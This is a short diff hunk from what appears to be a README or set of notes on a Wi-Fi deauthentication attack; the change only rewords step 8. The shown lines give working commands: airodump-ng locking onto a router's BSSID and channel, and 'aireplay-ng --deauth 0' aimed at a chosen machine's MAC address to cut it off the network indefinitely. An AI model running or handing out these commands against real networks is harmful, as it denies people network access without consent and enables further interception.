@@ -19,6 +19,6 @@ sudo airodump-ng wlan0mon --bssid <router's bssid> --channel <channel no.>
 7. run deauth attack to specific machine, run:
 sudo aireplay-ng --deauth 0 -c <mac address of machine> -a <bssid of router> wlan0mon
 
-8. wifi won't work on the targeted machine and see the attack working, run the following on the target machine:
+8. wifi will stop working on the targeted machine, run the following on the target machine:
 tshark -i wlan0mon
 
